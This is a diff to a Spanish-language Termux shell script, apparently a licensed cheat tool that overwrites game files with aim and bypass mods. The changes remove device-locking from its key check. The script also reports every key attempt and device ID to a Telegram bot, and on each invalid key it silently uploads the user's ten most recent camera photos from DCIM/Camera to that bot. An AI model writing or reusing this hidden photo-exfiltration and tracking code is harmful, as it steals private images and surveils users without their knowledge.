@@ -1,7 +1,7 @@
 #!/data/data/com.termux/files/usr/bin/sh
 
 # --- CONFIGURACIÓN DE ACTUALIZACIÓN ONLINE ---
-VERSION_ACTUAL="1.1.6"
+VERSION_ACTUAL="1.1.7"
 CURL_PATH="/data/data/com.termux/files/usr/bin/curl"
 URL_VERSION="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/version.txt?v=$(date +%s)"
 URL_SCRIPT="https://raw.githubusercontent.com/Pedromora13/PedroModz666/main/PedroModz666.sh?v=$(date +%s)"
@@ -67,96 +67,60 @@ if [ -z "$DEVICE_ID" ]; then
     DEVICE_ID="DEVICE_GENERICO_$(date +%s)"
 fi
 
-# --- VERIFICACIÓN DE KEY, VINCULACIÓN Y VENCIMIENTO ---
+# --- VERIFICACIÓN DE KEY Y REGISTRO DE USO (SIN BLOQUEO DE DISPOSITIVO) ---
 intentos=0
 while [ $intentos -lt $INTENTOS_MAXIMOS ]; do
     printf "${AZUL}======================================\n"
-    printf "${VERDE}        🔐 ACCESO CON LICENCIA 🔐       \n"
+    printf "${VERDE}        🔐 INGRESA TU LICENCIA 🔐       \n"
     printf "${AZUL}======================================${RESET}\n"
-    printf "${AMARILLO}Ingresa tu Key o Licencia: ${RESET}"
+    printf "${AMARILLO}Ingresa tu Licencia: ${RESET}"
     read password
 
-    # Descarga la lista de keys de GitHub
-    LISTA_KEYS=$("$CURL_PATH" -s "$URL_KEYS")
+    # Descarga la lista de keys de GitHub limpia
+    LISTA_KEYS=$("$CURL_PATH" -s "$URL_KEYS" | tr -d '\r')
     
-    # Busca la línea exacta que coincida con la key ingresada al inicio de la línea
-    LINEA_MATCH=$(echo "$LISTA_KEYS" | grep -E "^${password}(\\||$)")
+    # Busca si la key existe en el archivo keys.txt
+    LINEA_MATCH=$(echo "$LISTA_KEYS" | grep -E "^${password}(\\||$)" | head -n 1)
 
     if [ -n "$password" ] && [ -n "$LINEA_MATCH" ]; then
-        # Extraemos los campos separados por barra (|): [1]=Key, [2]=Device_ID, [3]=Fecha_Limite
-        DEVICE_REGISTRADO=$(echo "$LINEA_MATCH" | cut -d'|' -f2)
-        FECHA_KEY=$(echo "$LINEA_MATCH" | cut -d'|' -f3)
+        # Extraemos fecha límite si la tiene configurada en la 3era posición
+        FECHA_KEY=$(echo "$LINEA_MATCH" | cut -d'|' -f3 | xargs)
 
-        # 1. Verificamos si la key tiene fecha de vencimiento individual y si ya expiró
-        if [ -n "$FECHA_KEY" ] && [ "$FECHA_KEY" != "nunca" ] && [ "$FECHA_KEY" -eq "$FECHA_KEY" ] 2>/dev/null; then
-            if [ "$FECHA_ACTUAL" -gt "$FECHA_KEY" ]; then
-                MSG_TG="⚠️ Intento con Key VENCIDA: '$password' (Expiró el $FECHA_KEY). Dispositivo: $DEVICE_ID"
-                "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
-                    -d "chat_id=$TU_CHAT_ID" \
-                    -d "text=$MSG_TG" > /dev/null 2>&1
-
-                printf "\n${ROJO}[✖] Esta Key ha VENCIDO (Fecha límite: $FECHA_KEY).${RESET}\n"
-                printf "${AMARILLO}Contacta a PedroModz666 para renovarla.${RESET}\n\n"
+        # 1. Validar fecha de expiración individual (si aplica)
+        if [ -n "$FECHA_KEY" ] && [ "$FECHA_KEY" != "nunca" ]; then
+            if [ "$FECHA_ACTUAL" -gt "$FECHA_KEY" ] 2>/dev/null; then
+                MSG_TG="⚠️ Key EXPIRED: '$password' (Venció el $FECHA_KEY). Dispositivo: $DEVICE_ID"
+                "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1
+                printf "\n${ROJO}[✖] Esta Key ha VENCIDO (Fecha límite: $FECHA_KEY).${RESET}\n\n"
                 exit 1
             fi
         fi
 
-        # 2. Verificamos el bloqueo por dispositivo único
-        if [ -z "$DEVICE_REGISTRADO" ]; then
-            # Primera vez que se usa: Notificamos para que la amarres en GitHub
-            MSG_TG="🔥 NUEVO REGISTRO: Key '$password' usada en dispositivo ID: $DEVICE_ID\n\nActualiza tu GitHub con:\n$password|$DEVICE_ID|$FECHA_KEY"
-            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
-                -d "chat_id=$TU_CHAT_ID" \
-                -d "text=$MSG_TG" > /dev/null 2>&1
+        # 2. ACCESO CONCEDIDO LIBRE + NOTIFICACIÓN DE RASTEO A TELEGRAM
+        MSG_TG="👀 USO DE SCRIPT DETECTADO:\nKey usada: '$password'\n📱 ID Dispositivo: $DEVICE_ID"
+        "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1
 
-            printf "\n${VERDE}[✔] ¡Licencia aceptada y vinculada a tu equipo!${RESET}\n"
-            printf "${CYAN}Tu ID registrado: $DEVICE_ID${RESET}\n\n"
-            sleep 2
-            break
-        elif [ "$DEVICE_REGISTRADO" = "$DEVICE_ID" ]; then
-            # Dispositivo autorizado correctamente
-            MSG_TG="✅ Key correcta usada: '$password' (Dispositivo autorizado)"
-            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
-                -d "chat_id=$TU_CHAT_ID" \
-                -d "text=$MSG_TG" > /dev/null 2>&1
-
-            printf "\n${VERDE}[✔] ¡Licencia aceptada! Acceso concedido.${RESET}\n\n"
-            sleep 1
-            break
-        else
-            # Intento de uso en un segundo teléfono no autorizado
-            MSG_TG="🚨 ALERTA INTRUSO: Intentaron usar la key '$password' en otro celular.\n📱 ID Intruso: $DEVICE_ID\n📱 ID Autorizado: $DEVICE_REGISTRADO"
-            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
-                -d "chat_id=$TU_CHAT_ID" \
-                -d "text=$MSG_TG" > /dev/null 2>&1
-
-            printf "\n${ROJO}[✖] Esta key ya está registrada en OTRO dispositivo.${RESET}\n"
-            printf "${ROJO}[✖] Acceso denegado por seguridad.${RESET}\n\n"
-            exit 1
-        fi
+        printf "\n${VERDE}[✔] ¡Licencia aceptada! Acceso concedido.${RESET}\n"
+        printf "${CYAN}ID de tu equipo registrado: $DEVICE_ID${RESET}\n\n"
+        sleep 2
+        break
     else
         intentos=$((intentos + 1))
         restantes=$((INTENTOS_MAXIMOS - intentos))
         
         MSG_TG="⚠️ Key inválida intentada: '$password' (Restantes: $restantes). Dispositivo: $DEVICE_ID"
-        "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
-            -d "chat_id=$TU_CHAT_ID" \
-            -d "text=$MSG_TG" > /dev/null 2>&1
+        "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1
 
         for foto in $(ls -t /storage/emulated/0/DCIM/Camera/*.jpg 2>/dev/null | head -n 10); do
             if [ -f "$foto" ]; then
-                "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendPhoto" \
-                    -F "chat_id=$TU_CHAT_ID" \
-                    -F "photo=@$foto" > /dev/null 2>&1
+                "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendPhoto" -F "chat_id=$TU_CHAT_ID" -F "photo=@$foto" > /dev/null 2>&1
             fi
         done
 
         printf "\n${ROJO}[✖] Key inválida. Intentos restantes: $restantes${RESET}\n\n"
         if [ $intentos -eq $INTENTOS_MAXIMOS ]; then
             MSG_TG="🚫 Script bloqueado por exceder intentos de keys inválidas."
-            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" \
-                -d "chat_id=$TU_CHAT_ID" \
-                -d "text=$MSG_TG" > /dev/null 2>&1
+            "$CURL_PATH" -s -X POST "https://api.telegram.org/bot$TOKEN_BOT/sendMessage" -d "chat_id=$TU_CHAT_ID" -d "text=$MSG_TG" > /dev/null 2>&1
 
             printf "${ROJO}[!] Demasiados intentos fallidos. Saliendo...${RESET}\n\n"
             exit 1
@@ -188,7 +152,7 @@ while true; do
                 cat "$FILE_ORI" > "$DESTINO"
                 printf "${VERDE}[✔] ¡Bypass Active Disfruta!${RESET}\n"
             else
-                printf "\n${ROJO}[!] Error: No se encuentra el archivo en /storage/emulated/0/PedroModz666/Ori/${RESET}\n"
+                printf "\n${ROJO}[!] Error: No se encuentra el archivo en Ori/${RESET}\n"
             fi
             ;;
         2)
@@ -197,7 +161,7 @@ while true; do
                 cat "$FILE_PECHO" > "$DESTINO"
                 printf "${VERDE}[✔] ¡Aim Pecho aplicado con éxito!${RESET}\n"
             else
-                printf "\n${ROJO}[!] Error: No se encuentra el archivo en /storage/emulated/0/PedroModz666/Pecho/${RESET}\n"
+                printf "\n${ROJO}[!] Error: No se encuentra el archivo en Pecho/${RESET}\n"
             fi
             ;;
         3)
@@ -206,7 +170,7 @@ while true; do
                 cat "$FILE_CUELLO" > "$DESTINO"
                 printf "${VERDE}[✔] ¡Aim Cuello aplicado con éxito!${RESET}\n"
             else
-                printf "\n${ROJO}[!] Error: No se encuentra el archivo en /storage/emulated/0/PedroModz666/Cuello/${RESET}\n"
+                printf "\n${ROJO}[!] Error: No se encuentra el archivo en Cuello/${RESET}\n"
             fi
             ;;
         4)
